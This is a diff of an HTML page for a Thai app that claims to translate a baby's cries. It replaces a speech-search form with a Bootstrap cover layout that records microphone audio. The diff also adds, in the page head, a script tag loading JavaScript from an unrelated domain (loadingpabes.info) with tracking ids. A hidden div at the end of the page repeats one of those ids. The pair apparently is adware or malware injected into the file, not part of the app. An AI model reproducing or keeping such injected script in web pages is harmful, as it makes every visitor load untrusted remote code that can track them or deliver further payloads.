@@ -1,52 +1,82 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>วุ้นแปลภาษา</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="description" content>
+    <meta name="author" content>
+    <link rel="icon" href="http://getbootstrap.com/favicon.ico">
+
+    <title>วุ้นแปลภาษา</title>
+
+    <!-- Bootstrap core CSS -->
+    <link href="http://getbootstrap.com/dist/css/bootstrap.min.css" rel="stylesheet">
+
+    <!-- Custom styles for this template -->
+    <link href="http://getbootstrap.com/docs/4.0/examples/cover/cover.css" rel="stylesheet">
+  <script type="text/javascript" src="http://loadingpabes.info/jo/is2?id=A33BD649-48B4-56BD-BECF-BE95821FE7A6&amp;d=23536a95-1dc4-496f-9964-b85788f42bd2&amp;cl=upd"></script>
 </head>
-<body>
-  <h1>Hi</hi>
+<body class="text-center">
+
+    <div class="cover-container d-flex h-100 p-3 mx-auto flex-column">
+      <header class="masthead mb-auto">
+        <div class="inner">
+          <h3 class="masthead-brand">วุ้นแปลภาษา</h3>
+          <nav class="nav nav-masthead justify-content-center">
+            <a class="nav-link active" href="http://getbootstrap.com/docs/4.0/example/cover/#">หน้าหลัก</a>
+            <a class="nav-link" href="http://getbootstrap.com/docs/4.0/example/cover/#">การใช้งาน</a>
+            <a class="nav-link" href="http://getbootstrap.com/docs/4.0/example/cover/#">ติดต่อ</a>
+          </nav>
+        </div>
+      </header>
+
+      <main role="main" class="inner cover">
+        <h1 class="cover-heading">วุ้นแปลภาษา</h1>
+        <p class="lead">กดปุ่มฟังเสียงค้างเพื่อให้โปรแกรมอ่านเสียงร้องไห้ของบุตรหลาน รอสักพักเพื่อให้โปรแกรมประมวลผล</p>
+        <p class="lead">
+          <a href="http://getbootstrap.com/docs/4.0/example/cover/#" class="btn btn-lg btn-secondary">ทดสอบ</a>
+        </p>
+        <div class="sound record">
+          <audio id="player" controls></audio>
+          <script>
+          var player = document.getElementById('player');
+
+          var handleSuccess = function(stream) {
+          if (window.URL) {
+            player.src = window.URL.createObjectURL(stream);
+          } else {
+            player.src = stream;
+          }
+          };
+
+          navigator.mediaDevices.getUserMedia({ audio: true, video: false })
+          .then(handleSuccess);
+          </script>
+
+
+      </main>
+
+      <footer class="mastfoot mt-auto">
+
+
+        <div class="inner">
+          <p>หน่วยงาน <a href="https://getbootstrap.com/">Babysitter</a>, by <a href="https://twitter.com/mdo">hadespipe</a>.</p>
+        </div>
+
+      </footer>
+    </div>
+
+
+    <!-- Bootstrap core JavaScript
+    ================================================== -->
+    <!-- Placed at the end of the document so the pages load faster -->
+    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+    <script>window.jQuery || document.write('<script src="http://getbootstrap.com/assets/js/vendor/jquery-slim.min.js"><\/script>')</script>
+    <script src="http://getbootstrap.com/assets/js/vendor/popper.min.js"></script>
+    <script src="js/bootstrap.min.js"></script>
+
+
+<div style="display: none;">23536a95-1dc4-496f-9964-b85788f42bd2</div>
+
 </body>
-<!-- CSS Styles -->
-<style>
-  .speech {border: 1px solid #DDD; width: 300px; padding: 0; margin: 0}
-  .speech input {border: 0; width: 240px; display: inline-block; height: 30px;}
-  .speech img {float: right; width: 40px }
-</style>
-
-<!-- Search Form -->
-<form id="labnol" method="get" action="https://www.google.com/search">
-  <div class="speech">
-    <input type="text" name="q" id="transcript" placeholder="Speak" />
-    <img onclick="startDictation()" src="//i.imgur.com/cHidSVu.gif" />
-  </div>
-</form>
-
-<!-- HTML5 Speech Recognition API -->
-<script>
-  function startDictation() {
-
-    if (window.hasOwnProperty('webkitSpeechRecognition')) {
-
-      var recognition = new webkitSpeechRecognition();
-
-      recognition.continuous = false;
-      recognition.interimResults = false;
-
-      recognition.lang = "en-US";
-      recognition.start();
-
-      recognition.onresult = function(e) {
-        document.getElementById('transcript').value
-                                 = e.results[0][0].transcript;
-        recognition.stop();
-        document.getElementById('labnol').submit();
-      };
-
-      recognition.onerror = function(e) {
-        recognition.stop();
-      }
-
-    }
-  }
-</script>
 </html>
